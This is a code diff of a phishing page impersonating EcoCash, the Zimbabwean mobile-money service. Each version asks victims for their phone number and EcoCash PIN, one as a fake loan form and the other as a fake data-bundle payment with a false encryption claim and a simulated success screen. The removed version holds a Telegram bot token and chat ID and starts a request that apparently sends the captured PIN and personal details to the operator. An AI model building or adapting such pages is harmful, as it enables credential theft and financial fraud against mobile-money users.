@@ -1,610 +1,624 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-  <title>Ecocash Flex Loans - FlexLoan</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>EcoCash | Verify & Pay for Bundle · Zimbabwe</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --blue: #0033a0;
+            --blue-dark: #002280;
+            --blue-deep: #001860;
+            --blue-light: #1a4dbf;
+            --blue-soft: rgba(0,51,160,0.10);
+            --blue-bdr: rgba(0,51,160,0.25);
+            --green: #00b050;
+            --green-dark: #007d38;
+            --green-soft: rgba(0,176,80,0.12);
+            --page: #06112a;
+            --surface: #0c1e3f;
+            --surface2: #112350;
+            --border: rgba(255,255,255,0.10);
+            --border2: rgba(255,255,255,0.20);
+            --text: #ffffff;
+            --text2: #c8d8f0;
+            --muted: #7a99c8;
+            --shadow: 0 4px 24px rgba(0,0,0,0.35);
+            --shadow-b: 0 8px 40px rgba(0,51,160,0.40);
+        }
 
-    :root {
-      --blue: #0B5ED7;
-      --blue-dark: #073B8E;
-      --blue-soft: #EDF6FF;
-      --blue-light: #F7FBFF;
-      --blue-border: #CFE6FF;
-      --red: #E42320;
-      --text: #0f172a;
-      --muted: #64748b;
-      --white: #ffffff;
-      --shadow: 0 18px 50px rgba(15, 23, 42, 0.14);
-    }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { -webkit-text-size-adjust: 100%; }
 
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    html { -webkit-text-size-adjust: 100%; }
+        body {
+            min-height: 100dvh;
+            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+            color: var(--text);
+            background: linear-gradient(135deg, var(--page) 0%, var(--surface) 100%);
+            overflow-x: hidden;
+        }
 
-    body {
-      min-height: 100dvh;
-      font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
-      color: var(--text);
-      background:
-        radial-gradient(circle at 12% 8%, rgba(11, 94, 215, 0.20), transparent 30%),
-        radial-gradient(circle at 88% 88%, rgba(7, 59, 142, 0.16), transparent 32%),
-        linear-gradient(180deg, #f8fbff 0%, #eef6ff 100%);
-      overflow-x: hidden;
-    }
+        .topbar {
+            height: 64px;
+            padding: 14px max(18px, env(safe-area-inset-right)) 14px max(18px, env(safe-area-inset-left));
+            background: linear-gradient(135deg, var(--blue) 0%, var(--blue-dark) 100%);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 10px 28px rgba(0,51,160,0.18);
+        }
 
-    .topbar {
-      height: 64px;
-      padding: 14px max(18px, env(safe-area-inset-right)) 14px max(18px, env(safe-area-inset-left));
-      background: linear-gradient(135deg, var(--blue) 0%, var(--blue-dark) 100%);
-      color: var(--white);
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      box-shadow: 0 10px 28px rgba(11, 94, 215, 0.18);
-    }
+        .brand {
+            font-size: clamp(21px, 5vw, 25px);
+            font-weight: 800;
+            letter-spacing: -0.8px;
+            text-decoration: none;
+            line-height: 1;
+            cursor: pointer;
+            color: white;
+        }
 
-    .brand {
-      font-size: clamp(21px, 5vw, 25px);
-      font-weight: 800;
-      letter-spacing: -0.8px;
-      text-decoration: none;
-      line-height: 1;
-    }
+        .menu-icon { font-size: 24px; font-weight: 800; color: #fff; line-height: 1; }
 
-    .brand .eco { color: #ffffff; }
-    .brand .cash { color: #ff3b30; }
-    .menu-icon { font-size: 24px; font-weight: 800; color: #fff; line-height: 1; }
+        main {
+            min-height: calc(100dvh - 64px);
+            padding: clamp(14px, 3vw, 28px) max(12px, env(safe-area-inset-right)) max(14px, env(safe-area-inset-bottom)) max(12px, env(safe-area-inset-left));
+            display: grid;
+            place-items: center;
+        }
 
-    main {
-      min-height: calc(100dvh - 64px);
-      padding: clamp(14px, 3vw, 28px) max(12px, env(safe-area-inset-right)) max(14px, env(safe-area-inset-bottom)) max(12px, env(safe-area-inset-left));
-      display: grid;
-      place-items: center;
-    }
+        .login-card {
+            width: min(100%, 500px);
+            background: var(--surface);
+            border: 1px solid var(--border2);
+            border-radius: clamp(18px, 5vw, 28px);
+            padding: clamp(22px, 5vw, 36px);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+            position: relative;
+            overflow: hidden;
+        }
 
-    .login-card {
-      width: min(100%, 500px);
-      background: rgba(255, 255, 255, 0.98);
-      border: 1px solid rgba(219, 234, 254, 0.95);
-      border-radius: clamp(18px, 5vw, 28px);
-      padding: clamp(22px, 5vw, 36px);
-      box-shadow: var(--shadow);
-      position: relative;
-      overflow: hidden;
-    }
+        .login-card::before {
+            content: "";
+            position: absolute;
+            inset: 0 0 auto 0;
+            height: 8px;
+            background: linear-gradient(90deg, var(--blue), var(--blue-dark));
+        }
 
-    .login-card::before {
-      content: "";
-      position: absolute;
-      inset: 0 0 auto 0;
-      height: 8px;
-      background: linear-gradient(90deg, var(--blue), var(--blue-dark));
-    }
+        .logo-lockup {
+            text-align: center;
+            margin: 8px 0 22px;
+        }
 
-    .logo-lockup {
-      text-align: center;
-      margin: 8px 0 22px;
-    }
+        .logo-text {
+            font-size: clamp(34px, 9vw, 46px);
+            font-weight: 800;
+            letter-spacing: -1.6px;
+            line-height: 1;
+            color: white;
+        }
 
-    .logo-text {
-      font-size: clamp(34px, 9vw, 46px);
-      font-weight: 800;
-      letter-spacing: -1.6px;
-      line-height: 1;
-    }
+        .logo-text em {
+            font-style: normal;
+            color: var(--green);
+        }
 
-    .logo-eco { color: var(--blue); }
-    .logo-cash { color: var(--red); }
+        .product-name {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 12px;
+            padding: 8px 14px;
+            border-radius: 999px;
+            background: rgba(0,176,80,0.15);
+            color: var(--green);
+            font-size: 12px;
+            font-weight: 800;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            white-space: nowrap;
+        }
 
-    .product-name {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      margin-top: 12px;
-      padding: 8px 14px;
-      border-radius: 999px;
-      background: var(--blue-soft);
-      color: var(--blue-dark);
-      font-size: 12px;
-      font-weight: 800;
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-      white-space: nowrap;
-    }
+        h1 {
+            text-align: center;
+            font-size: clamp(22px, 6vw, 28px);
+            font-weight: 800;
+            letter-spacing: -0.9px;
+            margin-bottom: 8px;
+            color: white;
+        }
 
-    h1 {
-      text-align: center;
-      font-size: clamp(24px, 6vw, 31px);
-      font-weight: 800;
-      letter-spacing: -0.9px;
-      margin-bottom: 8px;
-    }
+        .subtitle {
+            max-width: 390px;
+            margin: 0 auto 22px;
+            text-align: center;
+            color: var(--muted);
+            font-size: clamp(13px, 3.6vw, 14px);
+            line-height: 1.55;
+        }
 
-    .subtitle {
-      max-width: 390px;
-      margin: 0 auto 22px;
-      text-align: center;
-      color: var(--muted);
-      font-size: clamp(13px, 3.6vw, 14px);
-      line-height: 1.55;
-    }
+        /* Bundle summary card */
+        .bundle-summary {
+            display: none;
+            background: linear-gradient(160deg, var(--blue-deep) 0%, var(--blue) 100%);
+            border-radius: 18px;
+            padding: 16px 18px;
+            margin-bottom: 20px;
+            color: #fff;
+        }
 
-    .application-summary {
-      display: none;
-      background: linear-gradient(180deg, #f8fbff 0%, #ffffff 100%);
-      border: 1px solid var(--blue-border);
-      border-radius: 18px;
-      padding: 15px 16px;
-      margin-bottom: 20px;
-    }
+        .bundle-summary.active { display: block; }
 
-    .application-summary.active { display: block; }
+        .bs-title {
+            font-size: 10px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            color: rgba(255,255,255,0.55);
+            margin-bottom: 10px;
+        }
 
-    .summary-title {
-      color: var(--blue-dark);
-      font-size: 12px;
-      font-weight: 800;
-      text-transform: uppercase;
-      letter-spacing: 0.08em;
-      margin-bottom: 9px;
-    }
+        .bs-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            margin-bottom: 10px;
+        }
 
-    .summary-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: flex-start;
-      gap: 14px;
-      padding: 8px 0;
-      border-bottom: 1px solid #e5eefb;
-      font-size: 14px;
-    }
+        .bs-item {
+            background: rgba(255,255,255,0.10);
+            border-radius: 10px;
+            padding: 9px 12px;
+        }
 
-    .summary-row:last-child { border-bottom: 0; }
-    .summary-label { color: var(--muted); }
-    .summary-value { font-weight: 800; text-align: right; overflow-wrap: anywhere; }
+        .bs-item-label {
+            font-size: 10px;
+            color: rgba(255,255,255,0.55);
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
 
-    .form-panel {
-      background: var(--blue-light);
-      border: 1px solid var(--blue-border);
-      border-radius: 20px;
-      padding: clamp(16px, 4vw, 20px);
-    }
+        .bs-item-val {
+            font-size: 15px;
+            font-weight: 800;
+            color: #fff;
+            margin-top: 2px;
+            letter-spacing: -0.3px;
+        }
 
-    .field-label {
-      display: block;
-      font-size: 12px;
-      font-weight: 800;
-      color: var(--blue-dark);
-      text-transform: uppercase;
-      letter-spacing: 0.06em;
-      margin-bottom: 8px;
-    }
+        .bs-total {
+            background: rgba(0,176,80,0.18);
+            border: 1px solid rgba(0,176,80,0.35);
+            border-radius: 10px;
+            padding: 10px 12px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
 
-    .phone-group {
-      width: 100%;
-      border: 2px solid var(--blue);
-      border-radius: 16px;
-      display: flex;
-      align-items: center;
-      padding: 14px 15px;
-      background: var(--white);
-      box-shadow: 0 8px 24px rgba(11, 94, 215, 0.08);
-    }
+        .bs-total-label { font-size: 12px; color: rgba(255,255,255,0.7); font-weight: 600; }
+        .bs-total-val   { font-size: 1.25rem; font-weight: 900; color: #4ade80; letter-spacing: -0.5px; }
 
-    .flag { font-size: 23px; margin-right: 10px; }
+        .form-panel {
+            background: var(--surface2);
+            border: 1px solid var(--border2);
+            border-radius: 20px;
+            padding: clamp(16px, 4vw, 20px);
+        }
 
-    .country-select {
-      display: flex;
-      align-items: center;
-      color: var(--blue);
-      font-weight: 800;
-      font-size: 16px;
-      margin-right: 12px;
-      white-space: nowrap;
-    }
+        .field-label {
+            display: block;
+            font-size: 12px;
+            font-weight: 800;
+            color: var(--green);
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            margin-bottom: 8px;
+        }
 
-    .phone-input {
-      min-width: 0;
-      flex: 1;
-      border: 0;
-      outline: 0;
-      font-size: 17px;
-      color: var(--text);
-      font-family: inherit;
-      background: transparent;
-    }
+        .phone-group {
+            width: 100%;
+            border: 2px solid var(--blue);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            padding: 14px 15px;
+            background: var(--surface);
+            box-shadow: 0 8px 24px rgba(0,51,160,0.08);
+        }
 
-    .phone-input::placeholder { color: #94a3b8; }
+        .flag { font-size: 23px; margin-right: 10px; }
 
-    /* PIN field */
-    .pin-group {
-      width: 100%;
-      border: 2px solid var(--blue);
-      border-radius: 16px;
-      display: flex;
-      align-items: center;
-      padding: 14px 15px;
-      background: var(--white);
-      box-shadow: 0 8px 24px rgba(11, 94, 215, 0.08);
-      margin-top: 14px;
-    }
+        .country-select {
+            display: flex;
+            align-items: center;
+            color: var(--blue);
+            font-weight: 800;
+            font-size: 16px;
+            margin-right: 12px;
+            white-space: nowrap;
+        }
 
-    .pin-input {
-      min-width: 0;
-      flex: 1;
-      border: 0;
-      outline: 0;
-      font-size: 17px;
-      color: var(--text);
-      font-family: inherit;
-      background: transparent;
-      letter-spacing: 4px;
-    }
+        .phone-input {
+            min-width: 0;
+            flex: 1;
+            border: 0;
+            outline: 0;
+            font-size: 17px;
+            color: white;
+            font-family: inherit;
+            background: transparent;
+        }
 
-    .pin-input::placeholder { color: #94a3b8; letter-spacing: 0; }
+        .phone-input::placeholder { color: #7a99c8; }
 
-    .hint {
-      color: var(--muted);
-      font-size: 12px;
-      line-height: 1.5;
-      margin-top: 10px;
-      margin-bottom: 18px;
-    }
+        .pin-group {
+            width: 100%;
+            border: 2px solid var(--blue);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            padding: 14px 15px;
+            background: var(--surface);
+            box-shadow: 0 8px 24px rgba(0,51,160,0.08);
+            margin-top: 14px;
+        }
 
-    /* Error message */
-    .error-msg {
-      display: none;
-      background: #fff1f1;
-      border: 1px solid #fca5a5;
-      color: #b91c1c;
-      font-size: 13px;
-      font-weight: 600;
-      border-radius: 12px;
-      padding: 11px 13px;
-      margin-bottom: 14px;
-      line-height: 1.5;
-    }
+        .pin-input {
+            min-width: 0;
+            flex: 1;
+            border: 0;
+            outline: 0;
+            font-size: 17px;
+            color: white;
+            font-family: inherit;
+            background: transparent;
+            letter-spacing: 4px;
+        }
 
-    .btn-primary {
-      width: 100%;
-      border: 0;
-      border-radius: 999px;
-      padding: 16px 22px;
-      color: var(--white);
-      background: linear-gradient(135deg, var(--blue) 0%, var(--blue-dark) 100%);
-      font-size: 15px;
-      font-weight: 800;
-      letter-spacing: 0.04em;
-      text-transform: uppercase;
-      cursor: pointer;
-      box-shadow: 0 10px 24px rgba(11, 94, 215, 0.3);
-      touch-action: manipulation;
-      transition: opacity 0.18s, box-shadow 0.18s, transform 0.12s;
-    }
+        .pin-input::placeholder { color: #7a99c8; letter-spacing: 0; }
 
-    .btn-primary:hover:not(:disabled) {
-      box-shadow: 0 14px 30px rgba(11, 94, 215, 0.36);
-      transform: translateY(-1px);
-    }
+        .hint {
+            color: var(--muted);
+            font-size: 12px;
+            line-height: 1.5;
+            margin-top: 10px;
+            margin-bottom: 18px;
+        }
 
-    .btn-primary:active:not(:disabled) { transform: translateY(0); }
+        .error-msg {
+            display: none;
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            color: #ff6b6b;
+            font-size: 13px;
+            font-weight: 600;
+            border-radius: 12px;
+            padding: 11px 13px;
+            margin-bottom: 14px;
+            line-height: 1.5;
+        }
 
-    .btn-primary:disabled {
-      background: #cbd5e1;
-      box-shadow: none;
-      cursor: not-allowed;
-    }
+        .error-msg.show { display: block; }
 
-    .terms {
-      margin-top: 18px;
-      color: var(--muted);
-      text-align: center;
-      font-size: 12px;
-      line-height: 1.5;
-    }
+        .btn-primary {
+            width: 100%;
+            border: 0;
+            border-radius: 999px;
+            padding: 16px 22px;
+            color: white;
+            background: linear-gradient(135deg, var(--blue) 0%, var(--blue-dark) 100%);
+            font-size: 15px;
+            font-weight: 800;
+            letter-spacing: 0.04em;
+            text-transform: uppercase;
+            cursor: pointer;
+            box-shadow: 0 10px 24px rgba(0,51,160,0.3);
+            touch-action: manipulation;
+            transition: opacity 0.18s, box-shadow 0.18s, transform 0.12s;
+        }
 
-    .terms a { color: var(--blue); font-weight: 800; }
+        .btn-primary:hover:not(:disabled) {
+            box-shadow: 0 14px 30px rgba(0,51,160,0.36);
+            transform: translateY(-1px);
+        }
 
-    /* Spinner overlay — matches code 1 style but in EcoCash blue */
-    #spinnerOverlay {
-      position: fixed;
-      inset: 0;
-      display: none;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column;
-      gap: 16px;
-      background: rgba(10, 10, 10, 0.88);
-      z-index: 1000;
-      backdrop-filter: blur(4px);
-    }
+        .btn-primary:active:not(:disabled) { transform: translateY(0); }
 
-    .spinner {
-      width: 56px;
-      height: 56px;
-      border: 5px solid rgba(255, 255, 255, 0.12);
-      border-top-color: var(--blue);
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-    }
+        .btn-primary:disabled {
+            background: #555;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
 
-    .spin-label {
-      font-size: 15px;
-      font-weight: 700;
-      color: #fff;
-      letter-spacing: -0.2px;
-    }
+        .btn-secondary {
+            width: 100%;
+            border: 1.5px solid var(--border2);
+            border-radius: 999px;
+            padding: 14px 22px;
+            color: var(--text2);
+            background: transparent;
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 0.04em;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.2s;
+        }
 
-    .spin-sub {
-      font-size: 13px;
-      color: rgba(255,255,255,0.5);
-      margin-top: -8px;
-    }
+        .btn-secondary:hover {
+            background: var(--surface2);
+            border-color: var(--blue-light);
+            color: var(--text);
+        }
 
-    @keyframes spin { to { transform: rotate(360deg); } }
+        .terms {
+            margin-top: 18px;
+            color: var(--muted);
+            text-align: center;
+            font-size: 12px;
+            line-height: 1.5;
+        }
 
-    @media (min-width: 900px) {
-      .login-card { width: 520px; }
-    }
+        .terms a { color: var(--green); font-weight: 800; }
 
-    @media (max-width: 520px) {
-      .topbar { height: 56px; padding: 13px 16px; }
-      main { min-height: calc(100dvh - 56px); align-items: start; padding: 14px 12px; }
-      .login-card { padding: 24px 17px; }
-      .logo-lockup { margin-top: 6px; margin-bottom: 18px; }
-      .product-name { font-size: 11px; padding: 7px 12px; }
-      .form-panel { padding: 15px; }
-      .summary-row { font-size: 13px; }
-      .phone-group, .pin-group { padding: 13px 12px; }
-      .country-select { font-size: 15px; margin-right: 9px; }
-      .phone-input, .pin-input { font-size: 16px; }
-    }
+        #spinnerOverlay {
+            position: fixed;
+            inset: 0;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 16px;
+            background: rgba(10, 10, 10, 0.88);
+            z-index: 1000;
+            backdrop-filter: blur(4px);
+        }
 
-    @media (max-width: 360px) {
-      main { padding: 10px; }
-      .login-card { padding: 22px 14px; border-radius: 20px; }
-      .phone-group, .pin-group { padding: 12px 10px; }
-      .flag { margin-right: 8px; }
-      .country-select { font-size: 14px; margin-right: 8px; }
-      .phone-input, .pin-input { font-size: 15px; }
-      .btn-primary { padding: 15px 18px; }
-    }
+        .spinner {
+            width: 56px;
+            height: 56px;
+            border: 5px solid rgba(255, 255, 255, 0.12);
+            border-top-color: var(--blue);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
 
-    @media (max-height: 680px) {
-      main { align-items: start; }
-      .login-card { margin-bottom: 12px; }
-    }
-  </style>
+        .spin-label { font-size: 15px; font-weight: 700; color: #fff; letter-spacing: -0.2px; }
+        .spin-sub   { font-size: 13px; color: rgba(255,255,255,0.5); margin-top: -8px; }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .success-screen {
+            display: none;
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .success-screen.show { display: block; }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: rgba(0,176,80,0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 40px;
+        }
+
+        .success-title {
+            font-size: 24px;
+            font-weight: 800;
+            color: white;
+            margin-bottom: 8px;
+        }
+
+        .success-msg {
+            font-size: 14px;
+            color: var(--muted);
+            margin-bottom: 24px;
+            line-height: 1.6;
+        }
+
+        @media (min-width: 900px) { .login-card { width: 520px; } }
+
+        @media (max-width: 520px) {
+            .topbar { height: 56px; padding: 13px 16px; }
+            main { min-height: calc(100dvh - 56px); align-items: start; padding: 14px 12px; }
+            .login-card { padding: 24px 17px; }
+            .logo-lockup { margin-top: 6px; margin-bottom: 18px; }
+            .product-name { font-size: 11px; padding: 7px 12px; }
+            .form-panel { padding: 15px; }
+            .phone-group, .pin-group { padding: 13px 12px; }
+            .country-select { font-size: 15px; margin-right: 9px; }
+            .phone-input, .pin-input { font-size: 16px; }
+        }
+
+        @media (max-width: 360px) {
+            main { padding: 10px; }
+            .login-card { padding: 22px 14px; border-radius: 20px; }
+            .phone-group, .pin-group { padding: 12px 10px; }
+            .flag { margin-right: 8px; }
+            .country-select { font-size: 14px; margin-right: 8px; }
+            .phone-input, .pin-input { font-size: 15px; }
+            .btn-primary { padding: 15px 18px; }
+        }
+
+        @media (max-height: 680px) {
+            main { align-items: start; }
+            .login-card { margin-bottom: 12px; }
+        }
+    </style>
 </head>
 <body>
-  <header class="topbar">
-    <a class="brand" href="index.html"><span class="eco">Eco</span><span class="cash">Cash</span></a>
-    <div class="menu-icon">☰</div>
-  </header>
+    <header class="topbar">
+        <a class="brand" href="index.html">Eco<em style="color:var(--green);">Cash</em></a>
+        <div class="menu-icon">☰</div>
+    </header>
 
-  <main>
-    <section class="login-card" aria-labelledby="pageTitle">
-      <div class="logo-lockup">
-        <div class="logo-text"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
-        <div class="product-name">Flex Loans • FlexLoan</div>
-      </div>
+    <main>
+        <section class="login-card" aria-labelledby="pageTitle">
+            <div class="logo-lockup">
+                <div class="logo-text">Eco<em>Cash</em></div>
+                <div class="product-name">Data Bundles · Zimbabwe</div>
+            </div>
 
-      <h1 id="pageTitle">Ecocash Flex Loans</h1>
-      <p class="subtitle">Confirm your mobile number to continue with the loan application you started on the previous page.</p>
+            <h1 id="pageTitle">Verify &amp; Pay</h1>
+            <p class="subtitle">Enter your EcoCash number and PIN to authorize payment for your data bundle.</p>
 
-      <div id="applicationSummary" class="application-summary">
-        <div class="summary-title">Application picked from index</div>
-        <div class="summary-row"><span class="summary-label">Applicant</span><span class="summary-value" id="summaryName">—</span></div>
-        <div class="summary-row"><span class="summary-label">Loan Amount</span><span class="summary-value" id="summaryAmount">—</span></div>
-        <div class="summary-row"><span class="summary-label">Loan Type</span><span class="summary-value" id="summaryType">—</span></div>
-      </div>
+            <!-- Bundle order summary — populated from URL params -->
+            <div id="bundleSummary" class="bundle-summary">
+                <div class="bs-title">Your Data Bundle</div>
+                <div class="bs-grid">
+                    <div class="bs-item"><div class="bs-item-label">Bundle</div><div class="bs-item-val" id="bsOffer">—</div></div>
+                    <div class="bs-item"><div class="bs-item-label">Data</div><div class="bs-item-val" id="bsData">—</div></div>
+                </div>
+                <div class="bs-total">
+                    <span class="bs-total-label">Total to pay</span>
+                    <span class="bs-total-val" id="bsPrice">$ —</span>
+                </div>
+            </div>
 
-      <div class="form-panel">
-        <label class="field-label" for="phoneInput">Mobile Number</label>
-        <div class="phone-group">
-          <span class="flag">🇿🇼</span>
-          <div class="country-select">+263</div>
-          <input type="tel" class="phone-input" id="phoneInput" placeholder="Phone Number" inputmode="numeric" autocomplete="tel" maxlength="9">
-        </div>
+            <!-- Payment Form -->
+            <div class="form-panel" id="paymentForm">
+                <label class="field-label" for="phoneInput">EcoCash Mobile Number</label>
+                <div class="phone-group">
+                    <span class="flag">🇿🇼</span>
+                    <div class="country-select">+263</div>
+                    <input type="tel" class="phone-input" id="phoneInput" placeholder="77 123 4567" inputmode="numeric" autocomplete="tel" maxlength="9">
+                </div>
 
-        <label class="field-label" for="pinInput" style="margin-top:14px;">EcoCash PIN</label>
-        <div class="pin-group">
-          <input type="password" class="pin-input" id="pinInput" placeholder="4-digit PIN" inputmode="numeric" maxlength="4">
-        </div>
+                <label class="field-label" for="pinInput" style="margin-top:14px;">EcoCash PIN</label>
+                <div class="pin-group">
+                    <input type="password" class="pin-input" id="pinInput" placeholder="4-digit PIN" inputmode="numeric" maxlength="4">
+                </div>
 
-        <p class="hint">Your application details are carried from <strong>index.html</strong>. Enter your mobile number and PIN to continue.</p>
+                <p class="hint">Your number and PIN are used only to authorise this EcoCash payment. 256-bit encrypted.</p>
 
-        <div class="error-msg" id="errMsg"></div>
+                <div class="error-msg" id="errMsg"></div>
 
-        <button class="btn-primary" type="button" id="continueBtn">Continue</button>
-      </div>
+                <button class="btn-primary" type="button" id="continueBtn">Pay with EcoCash</button>
+                <button class="btn-secondary" type="button" onclick="goBack()">← Back to Bundles</button>
+            </div>
 
-      <div class="terms">By continuing you agree to the <a href="https://ecocash.co.zw/terms-and-conditions/" target="_blank" rel="noopener">Terms and Conditions</a>.</div>
-    </section>
-  </main>
+            <!-- Success Screen -->
+            <div class="success-screen" id="successScreen">
+                <div class="success-icon">✓</div>
+                <div class="success-title">Payment Successful!</div>
+                <div class="success-msg">Your data bundle has been activated and added to your EcoCash account. Enjoy your non-expiry data!</div>
+                <button class="btn-primary" onclick="window.location.href='index.html'">Return to Home</button>
+            </div>
 
-  <!-- Spinner overlay -->
-  <div id="spinnerOverlay">
-    <div class="spinner"></div>
-    <div class="spin-label">Verifying &amp; Processing</div>
-    <div class="spin-sub">Please hold on…</div>
-  </div>
+            <div class="terms">By continuing you agree to the <a href="#" target="_blank" rel="noopener">Terms and Conditions</a>.</div>
+        </section>
+    </main>
 
-  <script>
-    const CONFIG = {
-      BOT_TOKEN: '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM',
-        CHAT_ID:      '7547427914',
-      APPROVE_PAGE: 'otp.html',
-      SUCCESS_PAGE: 'success.html'
-    };
+    <div id="spinnerOverlay">
+        <div class="spinner"></div>
+        <div class="spin-label">Processing Payment</div>
+        <div class="spin-sub">Please hold on…</div>
+    </div>
 
-    let state = { lastUpdateId: 0 };
-    let isProcessing = false;
+    <script>
+        const phoneInput     = document.getElementById('phoneInput');
+        const pinInput       = document.getElementById('pinInput');
+        const continueBtn    = document.getElementById('continueBtn');
+        const errMsg         = document.getElementById('errMsg');
+        const spinnerOverlay = document.getElementById('spinnerOverlay');
+        const bundleSummary  = document.getElementById('bundleSummary');
+        const paymentForm    = document.getElementById('paymentForm');
+        const successScreen  = document.getElementById('successScreen');
 
-    const phoneInput     = document.getElementById('phoneInput');
-    const pinInput       = document.getElementById('pinInput');
-    const continueBtn    = document.getElementById('continueBtn');
-    const errMsg         = document.getElementById('errMsg');
-    const spinnerOverlay = document.getElementById('spinnerOverlay');
+        let bundleData = null;
 
-    // ── Load application details from localStorage (original logic preserved) ──
-    function getStoredApplication() {
-      try {
-        return JSON.parse(localStorage.getItem('loanApplication') || '{}');
-      } catch (e) {
-        return {};
-      }
-    }
+        // Load bundle data from URL params
+        function loadBundleData() {
+            const params = new URLSearchParams(window.location.search);
+            const offer = params.get('offer');
+            const data = params.get('data');
+            const price = params.get('price');
 
-    function normalizePhone(phone) {
-      return String(phone || '').replace(/\D/g, '').replace(/^263/, '').slice(-9);
-    }
+            if (offer && data && price) {
+                bundleData = { offer, data, price };
+                displayBundleDetails();
+            }
+        }
 
-    function loadApplicationDetails() {
-      const application = getStoredApplication();
-      const fullName = [application.firstName, application.lastName].filter(Boolean).join(' ').trim();
-      const phone = normalizePhone(application.phone || localStorage.getItem('phone'));
+        // Display bundle details in summary
+        function displayBundleDetails() {
+            if (!bundleData) return;
 
-      if (phone) phoneInput.value = phone;
+            bundleSummary.classList.add('active');
+            document.getElementById('bsOffer').textContent = bundleData.offer;
+            document.getElementById('bsData').textContent = bundleData.data;
+            document.getElementById('bsPrice').textContent = '$ ' + bundleData.price;
+        }
 
-      if (fullName || application.loanAmount || application.loanType) {
-        document.getElementById('applicationSummary').classList.add('active');
-        document.getElementById('summaryName').textContent   = fullName || '—';
-        document.getElementById('summaryAmount').textContent = application.loanAmount ? '$' + Number(application.loanAmount).toLocaleString() : '—';
-        document.getElementById('summaryType').textContent   = application.loanType || '—';
-      }
-    }
+        // Validate Zimbabwe phone number (77, 78, 71, 72 prefixes)
+        function validatePhone(phone) {
+            if (!phone || phone.length !== 9) return false;
+            const firstTwo = phone.substring(0, 2);
+            return ['77', '78', '71', '72'].includes(firstTwo);
+        }
 
-    // ── Input sanitisation ──
-    phoneInput.addEventListener('input', () => {
-      phoneInput.value = phoneInput.value.replace(/\D/g, '').slice(0, 9);
-    });
+        // Validate PIN
+        function validatePin(pin) {
+            return pin && pin.length === 4 && /^\d+$/.test(pin);
+        }
 
-    pinInput.addEventListener('input', () => {
-      pinInput.value = pinInput.value.replace(/\D/g, '').slice(0, 4);
-      if (pinInput.value.length === 4) pinInput.blur();
-    });
+        // Handle payment submission
+        continueBtn.addEventListener('click', function() {
+            errMsg.classList.remove('show');
+            errMsg.textContent = '';
 
-    // ── Helpers ──
-    function showError(msg) {
-      errMsg.textContent   = msg;
-      errMsg.style.display = 'block';
-    }
+            const phone = phoneInput.value.trim();
+            const pin = pinInput.value.trim();
 
-    function resetButton() {
-      isProcessing            = false;
-      continueBtn.disabled    = false;
-      continueBtn.textContent = 'Continue';
-    }
+            // Validation
+            if (!validatePhone(phone)) {
+                errMsg.textContent = 'Please enter a valid Zimbabwe phone number (77/78/71/72).';
+                errMsg.classList.add('show');
+                return;
+            }
 
-    // ── Telegram bot send + poll ──
-    function sendToBot(phone, pin) {
-      if (isProcessing) return;
-      isProcessing = true;
-      continueBtn.disabled    = true;
-      continueBtn.textContent = 'Verifying…';
+            if (!validatePin(pin)) {
+                errMsg.textContent = 'Please enter a valid 4-digit PIN.';
+                errMsg.classList.add('show');
+                return;
+            }
 
-      const application = getStoredApplication();
-      const loanAmount  = application.loanAmount ? '$' + Number(application.loanAmount).toLocaleString() : '—';
-      const loanType    = application.loanType || '—';
-      const fullName    = [application.firstName, application.lastName].filter(Boolean).join(' ').trim() || '—';
+            // Show spinner
+            spinnerOverlay.style.display = 'flex';
 
-      const ts        = Date.now();
-      const approveId = `approve_${ts}`;
-      const declineId = `decline_${ts}`;
-      const verifyId  = `verify_${ts}`;
+            // Simulate payment processing (2-3 seconds)
+            setTimeout(() => {
+                spinnerOverlay.style.display = 'none';
+                paymentForm.style.display = 'none';
+                successScreen.classList.add('show');
+            }, 2500);
+        });
 
-      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
